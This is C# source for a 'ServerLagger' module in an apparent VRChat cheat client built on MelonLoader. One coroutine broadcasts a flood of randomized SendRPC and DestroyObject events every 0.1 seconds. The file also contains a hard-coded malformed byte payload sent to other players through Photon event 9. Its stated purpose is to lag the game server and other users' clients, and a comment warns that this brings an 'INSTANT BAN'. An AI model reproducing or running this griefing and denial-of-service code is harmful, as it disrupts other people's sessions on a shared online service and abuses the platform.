using ExitGames.Client.Photon;
using Photon.Pun;
using UnhollowerBaseLib;
using UnityEngine;
using VRC;
using VRC.SDKBase;
using RealisticEyeMovements;
using System.Linq;
using System.Collections;
using System.Threading;
using static VRC.SDKBase.VRC_EventHandler;
using System.IO;
using VRC.Core;
using System.Collections.Generic;
using MelonLoader;
using VRC.Utility;
using System;
using VRC.SDK3.Components;
using Photon.Realtime;

namespace Daydream.Client.Hacks
{
    internal class ServerLagger
    {
        // INSTANT BAN
        private static bool enabled = false;
        private static GameObject lastportal;
        private static VRCPlayer plr;
        private static object gameObject;

        private static string RandomString(int length)
        {
            char[] array = "abcdefghlijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789".ToArray();
            string text = string.Empty;
            Il2CppSystem.Random random = new Il2CppSystem.Random(new Il2CppSystem.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }
		public static IEnumerator HookSpawnEmojiRPC()
		{
			for(; ; )
            {
				if (enabled == false)
				{
					yield break;
				}
				try
				{
					VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
					{
						EventType = VRC_EventHandler.VrcEventType.SendRPC,
						Name = RandomString(240),
						ParameterObject = Networking.SceneEventHandler.gameObject,
						ParameterInt = 1,
						ParameterFloat = 0f,
						ParameterString = RandomString(840),
						ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
						ParameterBytes = new Il2CppStructArray<byte>(0L)
					};
					VRC_EventHandler.VrcEvent vrcEvent2 = new VRC_EventHandler.VrcEvent
					{
						EventType = VRC_EventHandler.VrcEventType.DestroyObject,
						Name = RandomString(240),
						ParameterObject = Networking.SceneEventHandler.gameObject,
						ParameterInt = 1,
						ParameterFloat = 0f,
						ParameterString = RandomString(840),
						ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
						ParameterBytes = new Il2CppStructArray<byte>(0L)
					};
					Networking.SceneEventHandler.TriggerEvent(vrcEvent, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, Classes.Daydream.localplayer, 0f);
					Networking.SceneEventHandler.TriggerEvent(vrcEvent2, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, Classes.Daydream.localplayer, 0f);
				}
				catch
				{
				}
				yield return new WaitForSecondsRealtime(0.1f);

			}
		}
		public static IEnumerator Desync()
		{
			while (enabled)
            {
				
				
			}
				yield return new WaitForEndOfFrame();
		}

		public static void update()
        {
			
		}

		private static VRC_EventHandler handler;
		public static void SendVRCEvent(VRC_EventHandler.VrcEvent vrcEvent, VRC_EventHandler.VrcBroadcastType type, GameObject instagator)
		{
			if (handler == null)
				handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>().FirstOrDefault();
			vrcEvent.ParameterObject = handler.gameObject;
			handler.TriggerEvent(vrcEvent, type, instagator);
			
		}
		private static void SendLag()
		{
			byte[] LagData = new byte[]
							{
								65,
								13,
								3,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								128,
								26,
								1,
								241,
								0,
								0,
								0,
								63,
								98,
								40,
								62,
								128,
								225,
								163,
								187,
								203,
								81,
								21,
								65,
								byte.MaxValue,
								69,
								byte.MaxValue,
								31,
								75,
								0,
								0,
								0,
								243,
								0,
								0,
								0,
								112,
								180,
								171,
								190,
								128,
								225,
								163,
								187,
								247,
								139,
								21,
								65,
								byte.MaxValue,
								69,
								byte.MaxValue,
								31,
								75,
								0,
								0,
								0,
								195,
								0,
								8,
								32,
								145,
								0,
								11,
								30,
								1,
								6,
								5,
								4,
								0,
								28,
								8,
								0,
								7,
								11,
								128,
								3,
								0,
								231,
								70,
								16,
								23,
								51,
								89,
								216,
								201,
								51,
								53,
								98,
								149,
								111,
								127,
								153,
								0,
								51,
								122,
								76,
								89,
								0,
								45,
								95,
								100,
								0,
								0,
								71,
								43,
								180,
								57,
								33,
								52,
								250,
								33,
								55,
								32,
								byte.MaxValue,
								138,
								6,
								242,
								56,
								6,
								37,
								158,
								39,
								181,
								177,
								228,
								41,
								91,
								175,
								12,
								41,
								251,
								38,
								173,
								172,
								82,
								160,
								6,
								38,
								90,
								187,
								173,
								50,
								26,
								46,
								137,
								56,
								6,
								178,
								124,
								180,
								101,
								59,
								22,
								47,
								77,
								170,
								239,
								48,
								88,
								146,
								44,
								52,
								235,
								55,
								64,
								56,
								55,
								55,
								161,
								172,
								221,
								49,
								151,
								27,
								252,
								151,
								39,
								176,
								155,
								49,
								232,
								180,
								105,
								52,
								11,
								181,
								174,
								180,
								65,
								35,
								36,
								175,
								19,
								59,
								230,
								185,
								223,
								180,
								103,
								184,
								166,
								52,
								10,
								50,
								85,
								53,
								138,
								48,
								210,
								45,
								118,
								185
							};
			Hacks.PhotonExtentions.OpRaiseEvent(9,
				LagData,
				new Photon.Realtime.RaiseEventOptions()
				{
					field_Public_ReceiverGroup_0 = Photon.Realtime.ReceiverGroup.Others,
					field_Public_EventCaching_0 = Photon.Realtime.EventCaching.DoNotCache,
				},
				default
			);
		}
        public static void enable(bool val)
        {
            enabled = val;
            Client.Classes.Daydream.HackUpdate("Lag Server", val);
            MelonCoroutines.Start(HookSpawnEmojiRPC());
            //VRChatUtilityKit.Utilities.VRCUtils.SelectedPlayer._player
        }
        public static void EmojiRPC(int i)
        {
            try
            {
                Il2CppSystem.Int32 @int = default;
                @int.m_value = i;
                Il2CppSystem.Object @object = @int.BoxIl2CppObject();
                Networking.RPC(0, Classes.Daydream.localplayer, "SpawnEmojiRPC", new Il2CppSystem.Object[]
                {
                    @object
                });
            }
            catch { }
        }
    }
}
